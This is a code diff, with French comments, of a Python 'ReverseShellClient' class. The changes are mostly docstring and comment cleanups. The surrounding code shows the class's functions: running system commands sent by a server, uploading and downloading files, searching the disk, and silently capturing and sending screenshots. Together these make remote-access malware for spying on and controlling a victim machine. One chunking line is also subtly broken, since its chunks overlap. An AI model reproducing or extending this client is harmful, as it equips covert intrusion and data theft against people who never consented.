@@ -18,8 +18,6 @@ logging.basicConfig(
     format="%(asctime)s - %(levelname)s - %(message)s",
 )
 
-# pour le screenshot en fonction du systeme d'exploitation
-# This is a hack to import PIL. ImageGrab from mss.
 if platform.system() == "Windows":
     from mss import mss
 else:
@@ -104,6 +102,7 @@ class ReverseShellClient:
     def handle_download(self, command):
         """
         Gère la commande de téléchargement.
+
         @param command - La commande reçue du serveur.
         """
         file_path = command.split(" ", 1)[1]
@@ -128,11 +127,10 @@ class ReverseShellClient:
     def handle_upload(self, command):
         """
         Gère la commande d'upload.
+
         @param command - La commande reçue du serveur contenant le chemin du fichier.
         """
-        command = command.replace("upload", "")
         parts = command.split(" ", 2)
-        logging.info(f"Parts: {parts}")
         file_path = parts[1]
         buffer_size = int(parts[2])
         try:
@@ -152,6 +150,7 @@ class ReverseShellClient:
     def handle_search(self, command):
         """
         Gère la commande de recherche en recherchant un fichier.
+
         @param command - La commande à exécuter au format "file : filename".
         """
         file_name = command.split(" ", 1)[1]
@@ -205,7 +204,7 @@ class ReverseShellClient:
             screenshot = ImageGrab.grab()
             screenshot.save(file_name)
             self.send_file(file_name)
-            os.remove(file_name)  # Nettoie le fichier après l'envoi
+            os.remove(file_name)
             logging.info(f"Capture d'écran {file_name} envoyée et supprimée")
         except Exception as e:
             logging.error(f"Échec de la capture d'écran: {e}")
@@ -237,6 +236,7 @@ class ReverseShellClient:
     def execute_command(self, command):
         """
         Exécute une commande et envoie le résultat au client.
+
         @param command - La commande à exécuter.
         """
         try:
@@ -249,6 +249,7 @@ class ReverseShellClient:
     def send_large_data(self, data):
         """
         Envoie des données volumineuses au client.
+
         @param data - Les données à envoyer au client en morceaux.
         """
         chunks = [data[i : i + 8192] for i in range(0, len(data), 4096)]
@@ -259,7 +260,9 @@ class ReverseShellClient:
     def run_system_command(self, command):
         """
         Exécute une commande système et retourne la sortie.
+
         @param command - La commande à exécuter.
+
         @return String avec la sortie de la commande ou le message d'erreur.
         """
         try:
